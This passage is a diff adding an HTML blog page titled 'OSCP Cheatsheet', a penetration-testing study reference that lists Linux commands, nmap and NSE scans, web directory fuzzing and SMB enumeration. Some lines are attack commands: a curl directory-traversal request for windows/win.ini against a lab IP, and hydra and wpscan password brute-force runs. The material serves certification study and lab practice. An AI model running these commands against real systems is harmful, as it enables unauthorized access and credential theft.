@@ -1,0 +1,1617 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>OSCP Cheatsheet // 0xl3mon💀</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="0xl3mon" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://0xl3mon.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="OSCP Cheatsheet"/>
+<meta name="twitter:description" content="Basic-Skills Linux Groups groupadd &lt;groupName&gt; addgroup &lt;groupName&gt; #(Create User) adduser &lt;username&gt; useradd &lt;username&gt; #(Añadir usuario a un grupo determinado) usermod -aG $group adduser user group usermod -a -G group user gpasswd -a grupo User -&gt; Add User to a group gpasswd -d grupo User -&gt; Delete User from a group Symbolik Links ln -s /opt/dirsearch/dirsearch.py /usr/bin/dirsearch ln -s -f /opt/drupwn/drupwn/usr/local/bin/drpwn Service Logs journalctl -u ssh.service --no-pager Linux Fundamentals #(Opens man pages for the specified tool)  man &lt;tool&gt; #(Prints the help page of the tool) &lt;tool&gt; h #(Searches through man pages&#39; descriptions for instances of a given keyword)  apropos &lt;keyword&gt; #(Concatenate and print files)  cat #(Displays current username)  whoami #(Returns users identity)  id #(Sets or prints the name of the current host system)  hostname #(Prints operating system name)  uname #(Returns working directory name)  pwd #(The ifconfig utility is used to assign or view an address to a network interface and/or configure network interface parameters)  ifconfig #(Ip is a utility to show or manipulate routing, network devices, interfaces, and tunnels)  ip #(Shows network status)  netstat #(Another utility to investigate sockets)  ss #(Shows process status)  ps #(Displays who is logged in)  who #(Prints environment or sets and executes a command)  env #(Lists block devices)  lsblk #(Lists USB devices)  lsusb #(Lists opened files)  lsof #(Lists PCI devices)  lspci #(Execute command as a different user)  sudo #(The su utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser)) A shell is then executed)  su #(Creates a new user or update default new user information)  useradd #(Deletes a user account and related files)  userdel #(Modifies a user account)  usermod #(Adds a group to the system)  addgroup #(Removes a group from the system)  delgroup #(Changes user password)  passwd #(Install, remove and configure Debianbased packages)  dpkg #(Highlevel package management commandline utility)  apt #(Alternative to apt)  aptitude #(Install, remove and configure snap packages)  snap #(Standard package manager for Ruby)  gem #(Standard package manager for Python)  pip #(Revision control system commandline utility)  git #(Commandline based service and systemd control manager)  systemctl #(Prints a snapshot of the current processes)  ps #(Query the systemd journal)  journalctl #(Sends a signal to a process)  kill #(Puts a process into background)  bg #(Lists all processes that are running in the background)  jobs #(Puts a process into the foreground)  fg #(Commandline utility to transfer data from or to a server)  curl #(An alternative to curl that downloads files from FTP or HTTP(s) server)  wget #(Starts a Python3 web server on TCP port 8000)  python3 m http-server #(Lists the contents of a directory recursively)  tree #(Searches for files in a directory hierarchy)  find #(Updates the locale database for existing contents on the system)  updatedb #(Uses the locale database to find contents on the system)  locate #(Pager that is used to read STDOUT or files)  more #(An alternative to more with more features)  less #(Prints the first ten lines of STDOUT or a file)  head #(Prints the last ten lines of STDOUT or a file)  tail #(Sorts the contents of STDOUT or a file)  sort #(Searches for specific results that contain given patterns)  grep #(Removes sections from each line of files)  cut #(Replaces certain characters)  tr #(Commandline based utility that formats its input into multiple columns)  column #(Pattern scanning and processing language)  awk #(A stream editor for filtering and transforming text)  sed #(Prints newline, word, and byte counts for a given input)  wc #(Changes permission of a file or directory)  chmod #(Changes the owner and group of a file or directory)  chown #(change keyboard layout) localectl list-x11-keymap-layouts setxkbmap -layout es Curl-Requests #(GET request with cURL) curl http://inlanefreight."/>
+
+    <meta property="og:title" content="OSCP Cheatsheet" />
+<meta property="og:description" content="Basic-Skills Linux Groups groupadd &lt;groupName&gt; addgroup &lt;groupName&gt; #(Create User) adduser &lt;username&gt; useradd &lt;username&gt; #(Añadir usuario a un grupo determinado) usermod -aG $group adduser user group usermod -a -G group user gpasswd -a grupo User -&gt; Add User to a group gpasswd -d grupo User -&gt; Delete User from a group Symbolik Links ln -s /opt/dirsearch/dirsearch.py /usr/bin/dirsearch ln -s -f /opt/drupwn/drupwn/usr/local/bin/drpwn Service Logs journalctl -u ssh.service --no-pager Linux Fundamentals #(Opens man pages for the specified tool)  man &lt;tool&gt; #(Prints the help page of the tool) &lt;tool&gt; h #(Searches through man pages&#39; descriptions for instances of a given keyword)  apropos &lt;keyword&gt; #(Concatenate and print files)  cat #(Displays current username)  whoami #(Returns users identity)  id #(Sets or prints the name of the current host system)  hostname #(Prints operating system name)  uname #(Returns working directory name)  pwd #(The ifconfig utility is used to assign or view an address to a network interface and/or configure network interface parameters)  ifconfig #(Ip is a utility to show or manipulate routing, network devices, interfaces, and tunnels)  ip #(Shows network status)  netstat #(Another utility to investigate sockets)  ss #(Shows process status)  ps #(Displays who is logged in)  who #(Prints environment or sets and executes a command)  env #(Lists block devices)  lsblk #(Lists USB devices)  lsusb #(Lists opened files)  lsof #(Lists PCI devices)  lspci #(Execute command as a different user)  sudo #(The su utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser)) A shell is then executed)  su #(Creates a new user or update default new user information)  useradd #(Deletes a user account and related files)  userdel #(Modifies a user account)  usermod #(Adds a group to the system)  addgroup #(Removes a group from the system)  delgroup #(Changes user password)  passwd #(Install, remove and configure Debianbased packages)  dpkg #(Highlevel package management commandline utility)  apt #(Alternative to apt)  aptitude #(Install, remove and configure snap packages)  snap #(Standard package manager for Ruby)  gem #(Standard package manager for Python)  pip #(Revision control system commandline utility)  git #(Commandline based service and systemd control manager)  systemctl #(Prints a snapshot of the current processes)  ps #(Query the systemd journal)  journalctl #(Sends a signal to a process)  kill #(Puts a process into background)  bg #(Lists all processes that are running in the background)  jobs #(Puts a process into the foreground)  fg #(Commandline utility to transfer data from or to a server)  curl #(An alternative to curl that downloads files from FTP or HTTP(s) server)  wget #(Starts a Python3 web server on TCP port 8000)  python3 m http-server #(Lists the contents of a directory recursively)  tree #(Searches for files in a directory hierarchy)  find #(Updates the locale database for existing contents on the system)  updatedb #(Uses the locale database to find contents on the system)  locate #(Pager that is used to read STDOUT or files)  more #(An alternative to more with more features)  less #(Prints the first ten lines of STDOUT or a file)  head #(Prints the last ten lines of STDOUT or a file)  tail #(Sorts the contents of STDOUT or a file)  sort #(Searches for specific results that contain given patterns)  grep #(Removes sections from each line of files)  cut #(Replaces certain characters)  tr #(Commandline based utility that formats its input into multiple columns)  column #(Pattern scanning and processing language)  awk #(A stream editor for filtering and transforming text)  sed #(Prints newline, word, and byte counts for a given input)  wc #(Changes permission of a file or directory)  chmod #(Changes the owner and group of a file or directory)  chown #(change keyboard layout) localectl list-x11-keymap-layouts setxkbmap -layout es Curl-Requests #(GET request with cURL) curl http://inlanefreight." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xl3mon.github.io/posts/oscp-notes/" />
+<meta property="article:published_time" content="2022-03-14T19:07:43+02:00" />
+<meta property="article:modified_time" content="2022-03-14T19:07:43+02:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://0xl3mon.github.io/"><img class="app-header-avatar" src="/avatar/panda-rose.jpg" alt="0xl3mon" /></a>
+      <h1>0xl3mon💀</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/posts/">𝘏𝘰𝘮𝘦</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">𝘏𝘢𝘤𝘬𝘛𝘩𝘦𝘉𝘰𝘹</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">𝘈𝘣𝘰𝘶𝘵</a>
+      </nav>
+      <p>ℂ𝕪𝕓𝕖𝕣𝕊𝕖𝕔𝕦𝕣𝕚𝕥𝕪 𝔹𝕝𝕠𝕘 </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/0xl3mon" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/rodrigo-flores-36847a233/" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>Linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">OSCP Cheatsheet</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Mar 14, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          30 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="basic-skills-linux">Basic-Skills Linux</h1>
+<h2 id="groups">Groups</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">groupadd &lt;groupName&gt;
+addgroup &lt;groupName&gt;
+	
+<span style="color:#75715e">#(Create User)</span>
+adduser &lt;username&gt;
+useradd &lt;username&gt;
+
+<span style="color:#75715e">#(Añadir usuario a un grupo determinado)</span>
+usermod -aG $group
+adduser user group
+usermod -a -G group user
+gpasswd -a grupo User -&gt; Add User to a group
+gpasswd -d grupo User -&gt; Delete User from a group
+</code></pre></div><h3 id="symbolik-links">Symbolik Links</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ln -s /opt/dirsearch/dirsearch.py /usr/bin/dirsearch
+ln -s -f /opt/drupwn/drupwn/usr/local/bin/drpwn
+</code></pre></div><h2 id="service-logs">Service Logs</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">journalctl -u ssh.service --no-pager
+</code></pre></div><h2 id="linux-fundamentals">Linux Fundamentals</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Opens man pages for the specified tool)  </span>
+man &lt;tool&gt; 
+<span style="color:#75715e">#(Prints the help page of the tool)</span>
+&lt;tool&gt; h    
+<span style="color:#75715e">#(Searches through man pages&#39; descriptions for instances of a given keyword)  </span>
+apropos &lt;keyword&gt; 
+<span style="color:#75715e">#(Concatenate and print files) </span>
+cat 
+<span style="color:#75715e">#(Displays current username)  </span>
+whoami 
+<span style="color:#75715e">#(Returns users identity)  </span>
+id 
+<span style="color:#75715e">#(Sets or prints the name of the current host system)  </span>
+hostname 
+<span style="color:#75715e">#(Prints operating system name)  </span>
+uname 
+<span style="color:#75715e">#(Returns working directory name)  </span>
+pwd 
+<span style="color:#75715e">#(The ifconfig utility is used to assign or view an address to a network interface and/or configure network interface parameters)  </span>
+ifconfig 
+<span style="color:#75715e">#(Ip is a utility to show or manipulate routing, network devices, interfaces, and tunnels)  </span>
+ip 
+<span style="color:#75715e">#(Shows network status)  </span>
+netstat 
+<span style="color:#75715e">#(Another utility to investigate sockets)  </span>
+ss 
+<span style="color:#75715e">#(Shows process status)  </span>
+ps 
+<span style="color:#75715e">#(Displays who is logged in) </span>
+who  
+<span style="color:#75715e">#(Prints environment or sets and executes a command)  </span>
+env 
+<span style="color:#75715e">#(Lists block devices)  </span>
+lsblk 
+<span style="color:#75715e">#(Lists USB devices)  </span>
+lsusb 
+<span style="color:#75715e">#(Lists opened files)  </span>
+lsof 
+<span style="color:#75715e">#(Lists PCI devices)  </span>
+lspci 
+<span style="color:#75715e">#(Execute command as a different user)  </span>
+sudo 
+<span style="color:#75715e">#(The su utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser))  A shell is then executed)  </span>
+su 
+<span style="color:#75715e">#(Creates a new user or update default new user information)  </span>
+useradd 
+<span style="color:#75715e">#(Deletes a user account and related files) </span>
+userdel 
+<span style="color:#75715e">#(Modifies a user account)  </span>
+usermod 
+<span style="color:#75715e">#(Adds a group to the system)  </span>
+addgroup 
+<span style="color:#75715e">#(Removes a group from the system)  </span>
+delgroup 
+<span style="color:#75715e">#(Changes user password) </span>
+passwd 
+<span style="color:#75715e">#(Install, remove and configure Debianbased packages)  </span>
+dpkg 
+<span style="color:#75715e">#(Highlevel package management commandline utility)  </span>
+apt 
+<span style="color:#75715e">#(Alternative to apt)  </span>
+aptitude 
+<span style="color:#75715e">#(Install, remove and configure snap packages) </span>
+snap 
+<span style="color:#75715e">#(Standard package manager for Ruby)  </span>
+gem 
+<span style="color:#75715e">#(Standard package manager for Python)  </span>
+pip 
+<span style="color:#75715e">#(Revision control system commandline utility)  </span>
+git 
+<span style="color:#75715e">#(Commandline based service and systemd control manager) </span>
+systemctl 
+<span style="color:#75715e">#(Prints a snapshot of the current processes)  </span>
+ps 
+<span style="color:#75715e">#(Query the systemd journal)  </span>
+journalctl 
+<span style="color:#75715e">#(Sends a signal to a process)  </span>
+kill 
+<span style="color:#75715e">#(Puts a process into background) </span>
+bg 
+<span style="color:#75715e">#(Lists all processes that are running in the background)  </span>
+jobs 
+<span style="color:#75715e">#(Puts a process into the foreground)  </span>
+fg 
+<span style="color:#75715e">#(Commandline utility to transfer data from or to a server)  </span>
+curl 
+<span style="color:#75715e">#(An alternative to curl that downloads files from FTP or HTTP(s) server) </span>
+wget 
+<span style="color:#75715e">#(Starts a Python3 web server on TCP port 8000)  </span>
+python3 m http-server 
+<span style="color:#75715e">#(Lists the contents of a directory recursively) </span>
+tree 
+<span style="color:#75715e">#(Searches for files in a directory hierarchy)   </span>
+find 
+<span style="color:#75715e">#(Updates the locale database for existing contents on the system) </span>
+updatedb 
+<span style="color:#75715e">#(Uses the locale database to find contents on the system)  </span>
+locate 
+<span style="color:#75715e">#(Pager that is used to read STDOUT or files) </span>
+more 
+<span style="color:#75715e">#(An alternative to more with more features)  </span>
+less 
+<span style="color:#75715e">#(Prints the first ten lines of STDOUT or a file) </span>
+head 
+<span style="color:#75715e">#(Prints the last ten lines of STDOUT or a file)  </span>
+tail 
+<span style="color:#75715e">#(Sorts the contents of STDOUT or a file) </span>
+sort 
+<span style="color:#75715e">#(Searches for specific results that contain given patterns)  </span>
+grep 
+<span style="color:#75715e">#(Removes sections from each line of files) </span>
+cut 
+<span style="color:#75715e">#(Replaces certain characters)  </span>
+tr 
+<span style="color:#75715e">#(Commandline based utility that formats its input into multiple columns) </span>
+column 
+<span style="color:#75715e">#(Pattern scanning and processing language) </span>
+awk 
+<span style="color:#75715e">#(A stream editor for filtering and transforming text)  </span>
+sed 
+<span style="color:#75715e">#(Prints newline, word, and byte counts for a given input) </span>
+wc 
+<span style="color:#75715e">#(Changes permission of a file or directory) </span>
+chmod 
+<span style="color:#75715e">#(Changes the owner and group of a file or directory) </span>
+chown 
+
+ <span style="color:#75715e">#(change keyboard layout)</span>
+ localectl list-x11-keymap-layouts
+ setxkbmap -layout es
+</code></pre></div><h2 id="curl-requests">Curl-Requests</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(GET request with cURL)</span>
+curl http://inlanefreight.com   
+<span style="color:#75715e">#(Verbose GET request with cURL)</span>
+curl http://inlanefreight.com -v   
+ 
+<span style="color:#75715e">#(cURL Basic Auth login)</span>
+curl http://admin:password@inlanefreight.com/ -vvv   
+<span style="color:#75715e">#(Alternate cURL Basic Auth login )</span>
+curl -u admin:password  http://inlanefreight.com/ -vvv  
+<span style="color:#75715e">#(cURL Basic Auth login, follow redirection )</span>
+curl -u admin:password -L http://inlanefreight.com/  
+<span style="color:#75715e">#(cURL GET request with parameter)</span>
+curl -u admin:password <span style="color:#e6db74">&#39;http://inlanefreight.com/search.php?port_code=us&#39;</span>   
+<span style="color:#75715e">#(POST request with cURL )</span>
+curl -d <span style="color:#e6db74">&#39;username=admin&amp;password=password&#39;</span> -L http://inlanefreight.com/login.php  
+
+<span style="color:#75715e">#(Curl Headers)</span>
+curl -s -X GET -H <span style="color:#e6db74">&#34;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#34;</span> <span style="color:#ae81ff">\ </span>
+-H <span style="color:#e6db74">&#34;Accept-Encoding: gzip, deflate&#34;</span> <span style="color:#ae81ff">\ </span>
+-H <span style="color:#e6db74">&#34;Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7&#34;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>-H <span style="color:#e6db74">&#34;User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&#34;</span> <span style="color:#ae81ff">\ </span>
+<span style="color:#e6db74">&#34;http://10.129.48.113/../../../../../../../../../../../../windows/win.ini&#34;</span> -v --path-as-is
+</code></pre></div><hr>
+<h2 id="nmap">Nmap</h2>
+<h3 id="basics-scan--services-scan">Basics scan &amp; Services Scan</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap 10.11.1.71 --top-ports <span style="color:#ae81ff">10</span> --open  	<span style="color:#75715e">#(LightScan  will do the &#34;10 most common ports)</span>
+nmap 10.11.1.72 -p- -sV --reason --dns-server $DNS 	<span style="color:#75715e">#(Heavy Scan I)</span>
+nmap 10.11.1.72 -p- -sT --reason --open --dns-server	<span style="color:#75715e">#(Heavy Scan II)</span>
+nmap 10.11.1.72 -p 22,25,80,110,111,119,2049,4555 -sV --reason --dns-server <span style="color:#75715e">#(Heavy Scan III)</span>
+
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap -sC -sV -T4 -n -Pn $IP -oN $name <span style="color:#75715e">#(default scripts,service enumeration, host dicovery)</span>
+nmap -p- --max-retries <span style="color:#ae81ff">1</span> --min-rate <span style="color:#ae81ff">5000</span> --max-scan-delay <span style="color:#ae81ff">20</span> -v --open 10.11.1.11   <span style="color:#75715e">#()</span>
+nmap -p- --open -T5 -v -n $IP -oG &lt;FileName&gt;
+nmap -sS --min-rate <span style="color:#ae81ff">5000</span> -Pn -p- --open -vvv -n &lt;IP&gt; -oG &lt;FileName&gt;
+</code></pre></div><h3 id="udp-scan">Udp Scan</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap -sU -p- --open --min-rate <span style="color:#ae81ff">5000</span> $IP -n -oN targeted
+nmap -sU 10.11.1.71 -p- --open 	<span style="color:#75715e">#(UDP SCAN)</span>
+sudo -sU -sS -sC -sV -oN $IP -v udp-scan 
+
+</code></pre></div><h3 id="locate-nse-scripts">Locate Nse Scripts</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">locate <span style="color:#e6db74">&#34;.nse&#34;</span>
+grep -r <span style="color:#e6db74">&#34;categories&#34;</span> *.nse | grep -oP <span style="color:#e6db74">&#39;&#34;.*?&#34;&#39;</span> | sort -u
+locate .nse | xargs grep <span style="color:#e6db74">&#34;categories&#34;</span> | grep -oP <span style="color:#e6db74">&#39;&#34;.*?&#34;&#39;</span> | sort -u 
+</code></pre></div><h2 id="nse-scripts">Nse Scripts</h2>
+<p><strong>Usefull nse scripts</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap --script-help script.nse <span style="color:#75715e">#(Help scripts)</span>
+batgrep <span style="color:#e6db74">&#34;@args&#34;</span> <span style="color:#66d9ef">$(</span>locate http-enum<span style="color:#66d9ef">)</span> <span style="color:#75715e">#(List args scripts)</span>
+
+// or
+locate .nse | grep <span style="color:#e6db74">&#34;wordpress&#34;</span> | xargs batgrep <span style="color:#e6db74">&#34;@args&#34;</span> 
+
+<span style="color:#75715e">#(Example nse Scripts)</span>
+nmap --script<span style="color:#f92672">=</span>smb-enum-shares.nse,smb-enum-users.nse -p445 -T4 &lt;IP&gt;    <span style="color:#75715e">#(Enumerate smb shares or users)</span>
+nmap --script http-enum --script-args http-enum.basepath<span style="color:#f92672">=</span>/nibbleblog/10.10.10.75 -p <span style="color:#ae81ff">80</span> <span style="color:#75715e">#(fuzzing http)</span>
+</code></pre></div><h3 id="recon-dns-nmap">Recon Dns Nmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap -sU -p <span style="color:#ae81ff">53</span> --open 10.11.1.1-254 -v -oG nameservers
+</code></pre></div><p><strong>Script to enumerate DNS Servers</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#!/bin/bash  
+</span><span style="color:#75715e"></span>  
+tput civis ;<span style="color:#66d9ef">for</span> dns in <span style="color:#66d9ef">$(</span>cat ips-dns<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>  
+timeout <span style="color:#ae81ff">1</span> bash -c <span style="color:#e6db74">&#34;/usr/bin/nslookup </span>$1<span style="color:#e6db74"> </span>$dns<span style="color:#e6db74">&#34;</span>  &amp; 
+<span style="color:#66d9ef">done</span> ; wait ; tput cnorm
+
+</code></pre></div><h2 id="banner-grabbing">Banner Grabbing</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nc -nv $IP $PORT
+nc -nvC $IP PORT
+</code></pre></div><hr>
+<h2 id="fuzzing-tools">Fuzzing Tools</h2>
+<h3 id="dirsearch">dirsearch</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">dirsearch -u http://10.10.10.7 -w /opt/Seclists/Discovery/Web-Content/raft-medium-words.txt -f -t <span style="color:#ae81ff">150</span> --simple-report<span style="color:#f92672">=</span>internal.txt
+dirsearch -u http ://10.10.248.29 -w /opt/Seclists/Discovery/Web-Content/raft-medium-words.txt -x 400,500 -r -t <span style="color:#ae81ff">150</span> --simple-report<span style="color:#f92672">=</span>internal.txt
+dirsearch -u http://&lt;url&gt; -w /opt/Seclists/Discovery/Web-Content/raft-medium-words.txt -x 400,500,301 -E -F -t <span style="color:#ae81ff">150</span>
+
+</code></pre></div><h3 id="dirsearch--iis">Dirsearch  IIS</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">dirsearch -u http://10.10.153.224:3333 -w /opt/Seclists/Discovery/Web-Content/raft-medium-words.txt -e “asp,aspx,html,txt” -f -t <span style="color:#ae81ff">150</span>
+dirsearch -u http://10.10.63.45:49663 -w /opt/Seclists/Discovery/Web-Content/raft-medium-words.txt -E -x 400,500 -r -t <span style="color:#ae81ff">50</span>
+
+</code></pre></div><h3 id="gobuster">Gobuster</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">gobuster -u http://target -w /root/SecLists-master/Discovery/Web-Content/common.txt
+gobuster dir -u http://10.10.10.93:80 -w /opt/Seclists/Discovery/Web-Content/raft-medium-words.txt -l -e -k -x .asp,.aspx,.txt -t <span style="color:#ae81ff">30</span> -o gobuster-scan.txt
+</code></pre></div><hr>
+<h2 id="smb">SMB</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">enum4linux $IP
+smbclient  //$IP/path -N
+</code></pre></div><h3 id="smbclient">SmbClient</h3>
+<p>list shares and connect</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">smbclient -L //$target -U lemon
+smbclient //192.168.1.144/c$ -p <span style="color:#ae81ff">139</span> -N
+
+<span style="color:#75715e">#(download recursive)</span>
+smbclient //$Ip/$share -U &lt;USER&gt; -c <span style="color:#e6db74">&#34;prompt OFF;recurse ON;mget *&#34;</span>
+</code></pre></div><p>Wen we obtain the error  <strong>&ldquo;Error protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED&rdquo;</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">smbclient //10.11.1.136/<span style="color:#e6db74">&#34;Bob Share&#34;</span> --option<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;client min protocol = NT1&#34;</span>
+smbclient -L //10.11.1.115 -p <span style="color:#ae81ff">139</span> --option <span style="color:#e6db74">&#34;client min protocol = LANMAN1&#34;</span>
+</code></pre></div><h3 id="smbmap">Smbmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">smbmap -H &lt;$IP -u ‘null’
+smbmap -R $Shared-Folder<span style="color:#f92672">)</span> 10.11.1.115  <span style="color:#75715e">#(List files recursively)</span>
+smbmap -R $Shared-Folder<span style="color:#f92672">)</span> 10.11.1.115 -A groups.xml -q 		<span style="color:#75715e">#(download One Single File)</span>
+smbget -R smb://&lt;IP&gt;/path 	<span style="color:#75715e">#(Download recursively)</span>
+
+</code></pre></div><h2 id="pop3---110">POP3 - 110</h2>
+<h3 id="brute-force">Brute force</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">hydra -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; -f &lt;IP&gt; pop3 -V
+hydra -S -v -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; -s <span style="color:#ae81ff">995</span> -f &lt;IP&gt; pop3 -V
+</code></pre></div><h3 id="read-mail">Read mail</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">telnet &lt;IP&gt; <span style="color:#ae81ff">110</span>
+
+USER &lt;USER&gt;
+PASS &lt;PASSWORD&gt;
+LIST
+RETR &lt;MAIL_NUMBER&gt;
+QUIT
+</code></pre></div><hr>
+<h2 id="cms-recon">Cms Recon</h2>
+<p><strong>Wordpress Scan</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Wpscan with api-key)</span>
+wpscan --url blog.thm -e u,vp --api-token &lt;APITOKEN&gt;
+wpscan --url http://10.10.10.88/webservices/wp/ --enumerate vp,u plugins-detection aggressive
+
+<span style="color:#75715e">#(Wpscan brute force)</span>
+wpscan --url http://<span style="color:#e6db74">&#34;127.0.0.1&#34;</span> --wordlist <span style="color:#e6db74">&#34;dic.txt&#34;</span> --username <span style="color:#e6db74">&#34;elliot&#34;</span>
+</code></pre></div><h3 id="automatic-scanners">Automatic scanners</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nikto -h &lt;URL&gt;
